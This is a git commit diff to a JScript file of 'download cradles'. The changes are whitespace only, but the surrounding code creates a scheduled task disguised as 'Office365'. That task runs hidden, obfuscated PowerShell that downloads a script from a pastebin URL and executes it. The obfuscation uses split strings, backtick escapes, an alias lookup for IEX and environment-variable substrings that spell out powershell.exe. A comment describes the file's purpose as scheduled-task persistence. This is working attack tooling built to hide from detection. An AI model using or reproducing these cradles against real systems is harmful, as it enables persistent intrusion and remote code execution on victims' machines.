3c18e2a62233fcaa09fbd487dc67828f787e7118
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-26 23:03:01 +0100

    Update Taskschedule_Download_Cradles.js

--- Taskschedule_Download_Cradles.js
+++ Taskschedule_Download_Cradles.js
@@ -3,14 +3,17 @@
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
 c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM \'I`eX (N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\"))"', 0);
 
+
 #Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
 c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM \'I`eX (N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\"))"', 0);
+
 
 #Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe
 #Info: &(GAL IE*) = Alias IEX
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
 c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w hidDEn -nOpR  -coM &(GAL IE*) ((N`E`W`-obje`CT Net.Webclient).\\\\\\"dowNloa`DST`RIng\\\\\\"((\\\\\\"https://pastebin.com/raw/Qpiz8y6c\\\\\\")))"', 0);
+
 
 #Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe
 #Info: &(GAL IE*) = Alias IEX
@@ -20,7 +23,6 @@ c.run('cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDA
 
 
 
- 
 #Info: This .js script can be used, to create a taskschedule persistence with a proxy aware PowerShell Download Cradle
 #Info: To escape \" in .js \\\\\\"
 c=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l");
